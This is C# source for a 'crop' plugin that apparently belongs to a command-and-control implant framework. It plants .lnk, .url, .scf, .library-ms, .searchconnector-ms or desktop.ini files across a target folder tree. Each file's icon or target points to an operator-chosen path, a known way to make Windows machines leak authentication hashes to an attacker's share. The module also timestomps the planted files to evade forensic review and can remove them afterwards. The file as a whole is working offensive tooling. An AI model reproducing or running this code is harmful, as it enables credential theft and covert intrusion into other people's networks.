using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "crop";
        private IServiceConfig config { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ICredentialProvider tokenManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.config = context.Config;
            this.logger = context.Logger;
            this.tokenManager = context.TokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, string> args =
                Misc.ConvertJsonStringToDict(job.task.parameters);
            var recurse = bool.Parse(args["recurse"]);
            var clean = bool.Parse(args["clean"]);

            var cfg = new Config(messageManager);
            cfg.targetLocation = args["targetLocation"].ToString();
            cfg.targetFilename = args["targetFilename"].ToString();
            cfg.targetPath = args["targetPath"].ToString();
            cfg.task_id = job.task.id;

            if (args.ContainsKey("timestomp")
                && !string.IsNullOrEmpty(args["timestomp"]))
            {
                cfg.timestomp = bool.Parse(args["timestomp"]);
            }

            if (!cfg.targetLocation.EndsWith("\\"))
                cfg.targetLocation = cfg.targetLocation + "\\";

            string filenameLower = cfg.targetFilename.ToLower();

            if (filenameLower.EndsWith(".lnk"))
            {
                HandleLnk(job, args, cfg, recurse, clean);
            }
            else if (filenameLower.EndsWith(".url")
                || filenameLower.EndsWith(".library-ms")
                || filenameLower.EndsWith(".searchconnector-ms")
                || filenameLower.EndsWith(".scf"))
            {
                HandleFileCrop(job, cfg, recurse, clean);
            }
            else if (filenameLower == "desktop.ini")
            {
                HandleDesktopIni(job, cfg, recurse, clean);
            }
            else
            {
                DebugLog.Log(
                    $"{Name} invalid file type: " +
                    $"{cfg.targetFilename} [{job.task.id}]");
                messageManager.WriteLine(
                    "[!] Not a valid file: " + cfg.targetFilename,
                    job.task.id, true, "error");
                return;
            }

            DebugLog.Log($"{Name} completed [{job.task.id}]");
            messageManager.WriteLine("[*] Done.", job.task.id, true);
        }

        private void HandleLnk(
            ServerJob job,
            Dictionary<string, string> args,
            Config cfg,
            bool recurse,
            bool clean)
        {
            DebugLog.Log(
                $"{Name} processing LNK file [{job.task.id}]");

            if (!args.ContainsKey("targetIcon")
                || string.IsNullOrEmpty(args["targetIcon"].ToString()))
            {
                messageManager.Write(
                    "No Target Icon specified" + Environment.NewLine,
                    job.task.id, true, "error");
                return;
            }

            cfg.targetIcon = args["targetIcon"].ToString().Trim();

            messageManager.WriteLine(
                "[*] Setting LNK value: " + cfg.targetIcon,
                job.task.id, false);
            messageManager.WriteLine(
                "[*] Icon location: " + cfg.targetPath,
                job.task.id, false);

            try
            {
                if (recurse)
                {
                    cfg.WalkDirectoryTree(cfg.targetLocation);
                    foreach (var folder in cfg.folders)
                    {
                        var f = folder;
                        if (!folder.EndsWith("\\"))
                            f = folder + "\\";
                        var output = f + cfg.targetFilename;
                        messageManager.WriteLine(
                            "[*] Writing LNK to: " + output,
                            job.task.id, false);
                        CropHelper.CreateLNKCrop(output, cfg);
                        cfg.ApplyTimestomp(output);
                    }
                }
                else if (clean)
                {
                    cfg.WalkDirectoryTree(cfg.targetLocation);
                    foreach (var folder in cfg.folders)
                    {
                        var f = folder;
                        if (!folder.EndsWith("\\"))
                            f = folder + "\\";
                        if (File.Exists(f + cfg.targetFilename))
                        {
                            File.Delete(f + cfg.targetFilename);
                            messageManager.WriteLine(
                                "[*] Removing file: "
                                + f + cfg.targetFilename,
                                job.task.id, false);
                        }
                    }
                }
                else
                {
                    var output = cfg.targetLocation + cfg.targetFilename;
                    messageManager.WriteLine(
                        "[*] Writing LNK to: " + output,
                        job.task.id, false);
                    CropHelper.CreateLNKCrop(output, cfg);
                    cfg.ApplyTimestomp(output);
                }
            }
            catch (Exception e)
            {
                messageManager.WriteLine(
                    e.ToString(), job.task.id, true, "error");
            }
        }

        private void HandleFileCrop(
            ServerJob job,
            Config cfg,
            bool recurse,
            bool clean)
        {
            DebugLog.Log(
                $"{Name} processing file crop [{job.task.id}]");
            messageManager.WriteLine(
                "[*] Setting target value: " + cfg.targetPath,
                job.task.id, false);

            try
            {
                if (recurse)
                {
                    cfg.WalkDirectoryTree(cfg.targetLocation);
                    foreach (var folder in cfg.folders)
                    {
                        var f = folder;
                        if (!folder.EndsWith("\\"))
                            f = folder + "\\";
                        var output = f + cfg.targetFilename;
                        messageManager.WriteLine(
                            "[*] Writing file to: " + output,
                            job.task.id, false);
                        CropHelper.CreateFileCrop(output, cfg);
                        cfg.ApplyTimestomp(output);
                    }
                }
                else if (clean)
                {
                    cfg.WalkDirectoryTree(cfg.targetLocation);
                    foreach (var folder in cfg.folders)
                    {
                        var f = folder;
                        if (!folder.EndsWith("\\"))
                            f = folder + "\\";
                        if (File.Exists(f + cfg.targetFilename))
                        {
                            File.Delete(f + cfg.targetFilename);
                            messageManager.WriteLine(
                                "[*] Removing file: "
                                + f + cfg.targetFilename,
                                job.task.id, false);
                        }
                    }
                }
                else
                {
                    var output =
                        cfg.targetLocation + cfg.targetFilename;
                    messageManager.WriteLine(
                        "[*] Writing file to: " + output,
                        job.task.id, false);
                    CropHelper.CreateFileCrop(output, cfg);
                    cfg.ApplyTimestomp(output);
                }
            }
            catch (Exception e)
            {
                messageManager.WriteLine(
                    e.ToString(), job.task.id, true, "error");
            }
        }

        private void HandleDesktopIni(
            ServerJob job,
            Config cfg,
            bool recurse,
            bool clean)
        {
            DebugLog.Log(
                $"{Name} processing desktop.ini [{job.task.id}]");
            messageManager.WriteLine(
                "[*] Setting desktop.ini target: " + cfg.targetPath,
                job.task.id, false);

            try
            {
                if (recurse)
                {
                    cfg.WalkDirectoryTree(cfg.targetLocation);
                    foreach (var folder in cfg.folders)
                    {
                        var f = folder;
                        if (!folder.EndsWith("\\"))
                            f = folder + "\\";
                        var output = f + cfg.targetFilename;
                        messageManager.WriteLine(
                            "[*] Writing desktop.ini to: " + output,
                            job.task.id, false);
                        CropHelper.CreateDesktopIniCrop(output, cfg);
                        cfg.ApplyTimestomp(output);
                    }
                }
                else if (clean)
                {
                    cfg.WalkDirectoryTree(cfg.targetLocation);
                    foreach (var folder in cfg.folders)
                    {
                        var f = folder;
                        if (!folder.EndsWith("\\"))
                            f = folder + "\\";
                        if (File.Exists(f + cfg.targetFilename))
                        {
                            try
                            {
                                File.SetAttributes(
                                    f + cfg.targetFilename,
                                    FileAttributes.Normal);
                            }
                            catch { }
                            File.Delete(f + cfg.targetFilename);
                            messageManager.WriteLine(
                                "[*] Removing file: "
                                + f + cfg.targetFilename,
                                job.task.id, false);
                        }
                    }
                }
                else
                {
                    var output =
                        cfg.targetLocation + cfg.targetFilename;
                    messageManager.WriteLine(
                        "[*] Writing desktop.ini to: " + output,
                        job.task.id, false);
                    CropHelper.CreateDesktopIniCrop(output, cfg);
                    cfg.ApplyTimestomp(output);
                }
            }
            catch (Exception e)
            {
                messageManager.WriteLine(
                    e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
